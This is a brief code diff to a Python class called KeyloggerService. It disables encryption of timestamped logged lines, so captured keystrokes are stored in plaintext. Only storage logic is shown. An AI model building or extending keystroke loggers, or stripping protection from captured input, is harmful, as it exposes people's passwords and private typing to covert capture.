@@ -118,8 +118,8 @@ class KeyloggerService:
     def _log_current_line(self):
         timestamp = datetime.now().strftime("%H:%M")
         log_line = f"{timestamp} | {self.current_line.strip()}"
-        encrypted_log = self.encryptor.encrypt(log_line)
-        self.logged_lines.append(encrypted_log)
+        # encrypted_log = self.encryptor.encrypt(log_line)
+        self.logged_lines.append(log_line)
 
     def get_logged_lines(self):
         return self.logged_lines
